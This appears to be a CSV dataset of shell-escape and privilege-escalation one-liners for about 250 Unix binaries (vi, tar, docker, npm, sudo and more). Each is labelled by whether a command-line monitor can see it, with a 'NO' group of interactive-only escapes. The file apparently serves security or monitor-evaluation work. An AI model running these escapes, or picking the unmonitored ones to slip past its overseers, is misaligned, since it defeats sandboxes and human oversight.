Binary,Classification,Command,Visible_in_CLI
ansible-test,interactive-only,ansible-test shell,NO
ash,interactive-only,ash,NO
bash,interactive-only,bash,NO
csh,interactive-only,csh,NO
dash,interactive-only,dash,NO
elvish,interactive-only,elvish,NO
fish,interactive-only,fish,NO
java,interactive-only,java Shell,NO
jshell,interactive-only,"jshell Runtime.getRuntime().exec(""/path/to/command"");",NO
nano,interactive-only,nano ^R^X reset; sh 1>&0 2>&0,NO
ncdu,interactive-only,ncdu b,NO
pic,interactive-only,pic -U .PS sh X sh X,NO
posh,interactive-only,posh,NO
pwsh,interactive-only,pwsh,NO
ranger,interactive-only,ranger S,NO
rc,interactive-only,rc,NO
sash,interactive-only,sash,NO
screen,interactive-only,screen,NO
sed,interactive-only,sed e,NO
systemd-run,interactive-only,systemd-run -S,NO
tclsh,interactive-only,tclsh,NO
tcsh,interactive-only,tcsh,NO
yash,interactive-only,yash,NO
zsh,interactive-only,zsh,NO
R,monitor-detectable,"R --no-save -e 'system(""/bin/sh"")'",YES
aa-exec,monitor-detectable,aa-exec /bin/sh,YES
agetty,monitor-detectable,agetty -l /bin/sh -o -p -a root tty,YES
ansible-playbook,monitor-detectable,"echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >/path/to/temp-file ansible-playbook /path/to/temp-file",YES
aoss,monitor-detectable,aoss /bin/sh,YES
apt-get,monitor-detectable,"echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' >/path/to/temp-file apt-get -y install -c /path/to/temp-file sl",YES
apt-get,monitor-detectable,apt-get update -o APT::Update::Pre-Invoke::=/bin/sh,YES
asterisk,monitor-detectable,asterisk -r !/bin/sh,YES
at,monitor-detectable,"echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null",YES
bconsole,monitor-detectable,bconsole @exec /bin/sh,YES
borg,monitor-detectable,"borg extract @:/::: --rsh ""/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'""",YES
bpftrace,monitor-detectable,"bpftrace --unsafe -e 'BEGIN {system(""/bin/sh 1<&0"");exit()}'",YES
bpftrace,monitor-detectable,"echo 'BEGIN {system(""/bin/sh 1<&0"");exit()}' >/path/to/temp-file bpftrace --unsafe /path/to/temp-file",YES
bpftrace,monitor-detectable,bpftrace -c /bin/sh -e 'END {exit()}',YES
bundle,monitor-detectable,BUNDLE_GEMFILE=x bundle exec /bin/sh,YES
bundle,monitor-detectable,touch Gemfile bundle exec /bin/sh,YES
bundle,monitor-detectable,"echo 'system(""/bin/sh"")' >Gemfile bundle install",YES
busctl,monitor-detectable,"busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",YES
busctl,monitor-detectable,"busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",YES
cabal,monitor-detectable,cabal exec --project-file=/dev/null -- /bin/sh,YES
capsh,monitor-detectable,capsh --,YES
cdist,monitor-detectable,cdist shell -s /bin/sh,YES
certbot,monitor-detectable,certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0',YES
check_by_ssh,monitor-detectable,"check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C x",YES
check_ssl_cert,monitor-detectable,echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file chmod +x /path/to/temp-file check_ssl_cert --grep-bin /path/to/temp-file -H x,YES
choom,monitor-detectable,choom -n 0 /bin/sh,YES
chroot,monitor-detectable,chroot /,YES
chrt,monitor-detectable,chrt 1 /bin/sh,YES
clisp,monitor-detectable,"clisp -x '(ext:run-shell-command ""/bin/sh"")(ext:exit)'",YES
cmake,monitor-detectable,echo 'execute_process(COMMAND /bin/sh)' >/path/to/CMakeLists.txt cmake /path/to/,YES
cobc,monitor-detectable,"echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' >/path/to/temp-file cobc -xFj --frelax-syntax-checks /path/to/temp-file",YES
composer,monitor-detectable,"echo '{""scripts"":{""x"":""/bin/sh""}}' >composer.json composer run-script x",YES
cpio,monitor-detectable,echo '/bin/sh </dev/tty >/dev/tty' >localhost cpio -o --rsh-command /bin/sh -F localhost:,YES
cpulimit,monitor-detectable,cpulimit -l 100 -f /bin/sh,YES
csvtool,monitor-detectable,csvtool call '/bin/sh;false' /etc/hosts,YES
ctr,monitor-detectable,"ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x",YES
dc,monitor-detectable,dc -e '!/bin/sh',YES
debugfs,monitor-detectable,debugfs !/bin/sh,YES
dhclient,monitor-detectable,dhclient -sf /bin/sh,YES
distcc,monitor-detectable,distcc /bin/sh,YES
dmsetup,monitor-detectable,dmsetup create base <<EOF 0 3534848 linear /dev/loop0 94208 EOF dmsetup ls --exec '/bin/sh -s',YES
doas,monitor-detectable,doas -u root /bin/sh,YES
docker,monitor-detectable,docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh,YES
docker,monitor-detectable,docker run --rm -it --privileged -u root alpine mount /dev/sda1 /mnt/ ls -la /mnt/ chroot /mnt /bin/bash,YES
dotnet,monitor-detectable,"dotnet fsi System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;",YES
dpkg,monitor-detectable,dpkg -i x_1.0_all.deb,YES
dvips,monitor-detectable,dvips -R0 texput.dvi,YES
easyrsa,monitor-detectable,"echo 'set_var X ""$(/bin/sh 1>&0)""' >/path/to/temp-file easyrsa --vars=/path/to/temp-file",YES
ed,monitor-detectable,ed !/bin/sh q,YES
emacs,monitor-detectable,"emacs -Q -nw --eval '(term ""/bin/sh"")'",YES
enscript,monitor-detectable,enscript /dev/null -qo /dev/null -I '/bin/sh >&2',YES
env,monitor-detectable,env /bin/sh,YES
ex,monitor-detectable,ex -c ':!/bin/sh',YES
expect,monitor-detectable,expect -c 'spawn /bin/sh;interact',YES
find,monitor-detectable,find . -exec /bin/sh \; -quit,YES
firejail,monitor-detectable,firejail /bin/sh,YES
flock,monitor-detectable,flock -u / /bin/sh,YES
forge,monitor-detectable,"echo '#!/bin/sh' >/path/to/temp-file echo -e ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" >>/path/to/temp-file chmod +x /path/to/temp-file forge build --use /path/to/temp-file",YES
ftp,monitor-detectable,ftp !/bin/sh,YES
fzf,monitor-detectable,fzf --bind 'enter:execute(/bin/sh)',YES
gawk,monitor-detectable,"gawk 'BEGIN {system(""/bin/sh"")}'",YES
gcc,monitor-detectable,"gcc -wrapper /bin/sh,-s x",YES
gdb,monitor-detectable,gdb -nx -ex '!/bin/sh' -ex quit,YES
gem,monitor-detectable,gem open -e '/bin/sh -s' debug,YES
genie,monitor-detectable,genie -c '/bin/sh',YES
ghc,monitor-detectable,"ghc -e 'System.Process.callCommand ""/bin/sh""'",YES
ghci,monitor-detectable,"ghci System.Process.callCommand ""/bin/sh""",YES
ginsh,monitor-detectable,ginsh !/bin/sh,YES
git,monitor-detectable,"PAGER='/bin/sh -c ""exec sh 0<&1""' git -p help",YES
git,monitor-detectable,git init . echo 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit chmod +x .git/hooks/pre-commit git -C . commit --allow-empty -m x,YES
git,monitor-detectable,ln -s /bin/sh git-x git --exec-path=. x,YES
gnuplot,monitor-detectable,"gnuplot -e 'system(""/bin/sh 1>&0"")'",YES
go,monitor-detectable,"echo -e 'package main\nimport ""syscall""\nfunc main(){\n\tsyscall.Exec(""/bin/sh"", []string{""/bin/sh"", ""-i""}, []string{})\n}' >/path/to/temp-file.go go run /path/to/temp-file.go",YES
grc,monitor-detectable,grc --pty /bin/sh,YES
gtester,monitor-detectable,echo 'exec /bin/sh 0<&1' >/path/to/temp-file chmod +x /path/to/temp-file gtester -q /path/to/temp-file,YES
guile,monitor-detectable,"guile -c '(system ""/bin/sh"")'",YES
hg,monitor-detectable,hg --config alias.x='!/bin/sh' x,YES
hping3,monitor-detectable,hping3 /bin/sh,YES
iftop,monitor-detectable,iftop !/bin/sh,YES
ionice,monitor-detectable,ionice /bin/sh,YES
ip,monitor-detectable,ip netns add foo ip netns exec foo /bin/sh ip netns delete foo,YES
ip,monitor-detectable,ip netns add foo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar ip netns exec bar /bin/sh ip netns delete foo ip netns delete bar,YES
ispell,monitor-detectable,ispell /etc/hosts !/bin/sh,YES
jjs,monitor-detectable,jjs Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty').waitFor(),YES
joe,monitor-detectable,joe ^K!/bin/sh,YES
jrunscript,monitor-detectable,"jrunscript -e 'exec(""/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty"")'",YES
jtag,monitor-detectable,jtag --interactive shell /bin/sh,YES
julia,monitor-detectable,julia -e 'run(`/bin/sh`)',YES
ksu,monitor-detectable,ksu -q -e /bin/sh,YES
kubectl,monitor-detectable,cat >/path/to/temp-file <<EOF clusters: - cluster: server: https://x name: x contexts: - context: cluster: x user: x name: x current-context: x users: - name: x user: exec: apiVersion: client.authentication.k8s.io/v1 interactiveMode: Always command: /bin/sh args: - '-c' - '/bin/sh 0<&2 1>&2' EOF kubectl get pods --kubeconfig=/path/to/temp-file,YES
latex,monitor-detectable,latex --shell-escape '\immediate\write18{/bin/sh}',YES
latexmk,monitor-detectable,latexmk -pdf -pdflatex='/bin/sh #' /dev/null,YES
ld.so,monitor-detectable,/path/to/ld.so /bin/sh,YES
less,monitor-detectable,less /etc/hosts !/bin/sh,YES
less,monitor-detectable,"LESSOPEN=""/bin/sh -s 1>&0 2>&0 # %s"" less /etc/hosts reset",YES
less,monitor-detectable,VISUAL='/bin/sh -s --' less /etc/hosts v,YES
lftp,monitor-detectable,lftp -c '!/bin/sh',YES
loginctl,monitor-detectable,loginctl user-status !/bin/sh,YES
logrotate,monitor-detectable,echo -e '/path/to/temp-file.config {\nmail x@x.x\n}' >/path/to/temp-file.config echo '/bin/sh 0<&2 1>&2' >/path/to/temp-file.sh logrotate -m /path/to/temp-file.sh -f /path/to/temp-file,YES
logsave,monitor-detectable,logsave /dev/null /bin/sh -i,YES
ltrace,monitor-detectable,ltrace -b -L /bin/sh,YES
lua,monitor-detectable,"lua -e 'os.execute(""/bin/sh"")'",YES
lxd,monitor-detectable,lxc init ubuntu:16.04 x -c security.privileged=true lxc config device add x x disk source=/ path=/mnt/ recursive=true lxc start x lxc exec x /bin/sh,YES
lxd,monitor-detectable,lxc image import ./alpine*.tar.gz --alias x lxc init x x -c security.privileged=true lxc config device add x x disk source=/ path=/mnt/ recursive=true lxc start x lxc exec x /bin/sh,YES
m4,monitor-detectable,echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4,YES
mail,monitor-detectable,mail --exec='!/bin/sh',YES
mail,monitor-detectable,mail -f /etc/hosts !/bin/sh,YES
make,monitor-detectable,make --eval='$(shell /bin/sh 1>&0)' .,YES
man,monitor-detectable,man '-H/bin/sh #' man,YES
mawk,monitor-detectable,"mawk 'BEGIN {system(""/bin/sh"")}'",YES
minicom,monitor-detectable,minicom -D /dev/null,YES
minicom,monitor-detectable,echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >/path/to/temp-file minicom -D /dev/null -S /path/to/temp-file reset^J,YES
more,monitor-detectable,more /etc/hosts !/bin/sh,YES
mosh-server,monitor-detectable,mosh --server=mosh-server localhost /bin/sh,YES
msgfilter,monitor-detectable,echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID',YES
multitime,monitor-detectable,multitime /bin/sh,YES
mysql,monitor-detectable,mysql -e '\! /bin/sh',YES
nano,monitor-detectable,nano -s /bin/sh /bin/sh ^T^T,YES
ncftp,monitor-detectable,ncftp !/bin/sh,YES
neofetch,monitor-detectable,echo 'exec /bin/sh' >/path/to/temp-file neofetch --config /path/to/temp-file,YES
nice,monitor-detectable,nice /bin/sh,YES
nmap,monitor-detectable,nmap --interactive !/bin/sh,YES
node,monitor-detectable,"node -e 'require(""child_process"").spawn(""/bin/sh"", {stdio: [0, 1, 2]})'",YES
nohup,monitor-detectable,nohup /bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty',YES
npm,monitor-detectable,npm exec /bin/sh,YES
npm,monitor-detectable,"echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' >package.json npm -C . i",YES
npm,monitor-detectable,"echo '{""scripts"": {""xxx"": ""/bin/sh""}}' >package.json npm -C . run xxx",YES
nroff,monitor-detectable,echo /bin/sh >groff chmod +x groff GROFF_BIN_PATH=. nroff,YES
nsenter,monitor-detectable,nsenter /bin/sh,YES
octave,monitor-detectable,"octave-cli --eval 'system(""/bin/sh"")'",YES
openvpn,monitor-detectable,openvpn --dev null --script-security 2 --up '/bin/sh -s',YES
opkg,monitor-detectable,rpm opkg install x_1.0_all.deb,YES
pdflatex,monitor-detectable,pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',YES
pdftex,monitor-detectable,pdftex --shell-escape '\write18{/bin/sh}\end',YES
perf,monitor-detectable,perf stat /bin/sh,YES
perl,monitor-detectable,"perl -e 'exec ""/bin/sh""'",YES
perl,monitor-detectable,"PERL5OPT=-d PERL5DB='exec ""/bin/sh""' perl /dev/null",YES
perlbug,monitor-detectable,perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #',YES
pexec,monitor-detectable,pexec /bin/sh,YES
pg,monitor-detectable,pg /etc/hosts !/bin/sh,YES
php,monitor-detectable,"php -r 'system(""/bin/sh -i"");'",YES
php,monitor-detectable,"php -r 'passthru(""/bin/sh -i"");'",YES
php,monitor-detectable,"php -r '$h=@popen(""/bin/sh -i"",""r""); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'",YES
php,monitor-detectable,"php -r 'pcntl_exec(""/bin/sh"");'",YES
pidstat,monitor-detectable,pidstat -e /bin/sh,YES
pip,monitor-detectable,pip config --editor '/bin/sh -s' edit,YES
pkexec,monitor-detectable,pkexec /bin/sh,YES
plymouth,monitor-detectable,plymouth ask-for-password --prompt=x --command=/bin/sh,YES
podman,monitor-detectable,podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh,YES
psftp,monitor-detectable,psftp !/bin/sh,YES
psql,monitor-detectable,psql \! /bin/sh,YES
puppet,monitor-detectable,"puppet apply -e ""exec { '/bin/sh <$(tty) >$(tty) 2>$(tty)': }""",YES
python,monitor-detectable,"python -c 'import os; os.execl(""/bin/sh"", ""sh"")'",YES
restic,monitor-detectable,"RESTIC_PASSWORD_COMMAND='/bin/sh -c ""/bin/sh 0<&2 1<&2""' restic backup",YES
restic,monitor-detectable,"restic --password-command='/bin/sh -c ""/bin/sh 0<&2 1<&2""' backup",YES
rlwrap,monitor-detectable,rlwrap /bin/sh,YES
rpm,monitor-detectable,rpm --eval '%(/bin/sh 1>&2)',YES
rpm,monitor-detectable,rpm --pipe '/bin/sh 0<&1',YES
rpmdb,monitor-detectable,rpmdb --eval '%(/bin/sh 1>&2)',YES
rpmquery,monitor-detectable,rpmquery --eval '%(/bin/sh 1>&2)',YES
rpmverify,monitor-detectable,rpmverify --eval '%(/bin/sh 1>&2)',YES
rsync,monitor-detectable,"rsync -e '/bin/sh -c ""/bin/sh 0<&2 1>&2""' x:x",YES
rtorrent,monitor-detectable,"echo 'execute = /bin/sh,-c,""/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >~/.rtorrent.rc rtorrent",YES
ruby,monitor-detectable,"ruby -e 'exec ""/bin/sh""'",YES
run-parts,monitor-detectable,run-parts --new-session --regex '^sh$' /bin,YES
run-parts,monitor-detectable,cp /bin/sh /path/to/temp-dir/ run-parts /path/to/temp-dir/,YES
runscript,monitor-detectable,echo '! exec /bin/sh' >/path/to/temp-file runscript /path/to/temp-file,YES
rustup,monitor-detectable,mkdir /path/to/temp-dir/bin/ mkdir /path/to/temp-dir/lib/ cp /bin/sh /path/to/temp-dir/bin/rustc rustup toolchain link x /path/to/temp-dir/ rustup run x rustc,YES
scanmem,monitor-detectable,scanmem shell /bin/sh,YES
scp,monitor-detectable,echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file chmod +x /path/to/temp-file scp -S /path/to/temp-file x x:,YES
scp,monitor-detectable,scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:,YES
script,monitor-detectable,script -q /dev/null,YES
scrot,monitor-detectable,scrot -e /bin/sh,YES
sed,monitor-detectable,sed -n '1e exec /bin/sh 1>&0' /etc/hosts,YES
service,monitor-detectable,service ../../bin/sh,YES
setarch,monitor-detectable,setarch -3 /bin/sh,YES
setlock,monitor-detectable,setlock - /bin/sh,YES
sftp,monitor-detectable,sftp user@attacker.com !/bin/sh,YES
sg,monitor-detectable,sg $(id -ng),YES
slsh,monitor-detectable,"slsh -e 'system(""/bin/sh"")'",YES
smbclient,monitor-detectable,smbclient '\\host\share' !/bin/sh,YES
socat,monitor-detectable,"socat - exec:/bin/sh,pty,ctty,raw,echo=0",YES
softlimit,monitor-detectable,softlimit /bin/sh,YES
split,monitor-detectable,split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts,YES
sqlite3,monitor-detectable,sqlite3 /dev/null '.shell /bin/sh',YES
ssh,monitor-detectable,ssh localhost /bin/sh,YES
ssh,monitor-detectable,ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x,YES
ssh,monitor-detectable,ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost,YES
ssh-agent,monitor-detectable,ssh-agent /bin/sh,YES
sshfs,monitor-detectable,echo -e '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >/path/to/temp-file chmod +x /path/to/temp-file sshfs -o ssh_command=/path/to/temp-file x: /path/to/dir/,YES
sshpass,monitor-detectable,sshpass /bin/sh,YES
sshuttle,monitor-detectable,"sudo sshuttle -r x --ssh-cmd '/bin/sh -c ""/bin/sh 0<&2 1>&2""' localhost",YES
start-stop-daemon,monitor-detectable,start-stop-daemon -S -x /bin/sh,YES
stdbuf,monitor-detectable,stdbuf -i0 /bin/sh,YES
strace,monitor-detectable,strace -o /dev/null /bin/sh,YES
su,monitor-detectable,su -c /bin/sh,YES
sudo,monitor-detectable,sudo /bin/sh,YES
systemctl,monitor-detectable,echo '[Service] Type=oneshot ExecStart=/path/to/command [Install] WantedBy=multi-user.target' >/path/to/temp-file.service systemctl link /path/to/temp-file.service systemctl enable --now /path/to/temp-file.service,YES
systemctl,monitor-detectable,echo /bin/sh >/path/to/temp-file chmod +x /path/to/temp-file SYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target,YES
systemd-run,monitor-detectable,systemd-run -t /bin/sh,YES
tar,monitor-detectable,tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh,YES
tar,monitor-detectable,"tar xf /dev/null -I '/bin/sh -c ""/bin/sh 0<&2 1>&2""'",YES
tar,monitor-detectable,echo '/bin/sh 0<&1' >/path/to/temp-file tar cf /path/to/temp-file.tar /path/to/temp-file tar xf /path/to/temp-file.tar --to-command /bin/sh,YES
task,monitor-detectable,task execute /bin/sh,YES
taskset,monitor-detectable,taskset 1 /bin/sh,YES
tasksh,monitor-detectable,tasksh !/bin/sh,YES
tdbtool,monitor-detectable,tdbtool ! /bin/sh,YES
telnet,monitor-detectable,telnet !/bin/sh,YES
tex,monitor-detectable,tex --shell-escape '\immediate\write18{/bin/sh}',YES
time,monitor-detectable,time /bin/sh,YES
timeout,monitor-detectable,timeout 0 /bin/sh,YES
tmate,monitor-detectable,tmate -c /bin/sh,YES
tmux,monitor-detectable,tmux -c /bin/sh,YES
tmux,monitor-detectable,tmux -S /path/to/socket,YES
top,monitor-detectable,echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc top # press return twice reset,YES
torify,monitor-detectable,torify /bin/sh,YES
torsocks,monitor-detectable,torsocks /bin/sh,YES
unshare,monitor-detectable,unshare /bin/sh,YES
uv,monitor-detectable,uv run /bin/sh,YES
valgrind,monitor-detectable,valgrind /bin/sh,YES
vi,monitor-detectable,vi -c ':!/bin/sh' /dev/null,YES
vi,monitor-detectable,vi -c ':shell',YES
vi,monitor-detectable,vi -c ':set shell=/bin/sh | shell',YES
vi,monitor-detectable,vi -c :terminal /bin/sh,YES
watch,monitor-detectable,watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0',YES
watch,monitor-detectable,watch 'reset; exec /bin/sh 1>&0 2>&0',YES
wg-quick,monitor-detectable,cat >/path/to/temp-file.conf <<EOF [Interface] PostUp = /bin/sh EOF wg-quick up /path/to/temp-file.conf,YES
wget,monitor-detectable,echo -e '#!/bin/sh\n/bin/sh 1>&0' >/path/to/temp-file chmod +x /path/to/temp-file wget --use-askpass=/path/to/temp-file 0,YES
xargs,monitor-detectable,xargs -a /dev/null /bin/sh,YES
xargs,monitor-detectable,xargs -a /dev/null /bin/sh,YES
xargs,monitor-detectable,echo x | xargs -o -a /dev/null /bin/sh,YES
xdg-user-dir,monitor-detectable,xdg-user-dir '}; /bin/sh #',YES
xdotool,monitor-detectable,xdotool exec --sync /bin/sh,YES
yarn,monitor-detectable,yarn exec /bin/sh,YES
yarn,monitor-detectable,"echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' >package.json yarn --cwd .",YES
yarn,monitor-detectable,"echo '{""scripts"": {""xxx"": ""/bin/sh""}}' >package.json yarn --cwd . xxx",YES
yt-dlp,monitor-detectable,yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #',YES
zathura,monitor-detectable,zathura :! /bin/sh -c 'exec /bin/sh 0<&1',YES
zip,monitor-detectable,zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #',YES
zypper,monitor-detectable,cp /bin/sh /usr/lib/zypper/commands/zypper-x zypper x,YES
zypper,monitor-detectable,cp /bin/sh /path/to/temp-dir/zypper-x PATH=$PATH:/path/to/temp-dir/ zypper x,YES
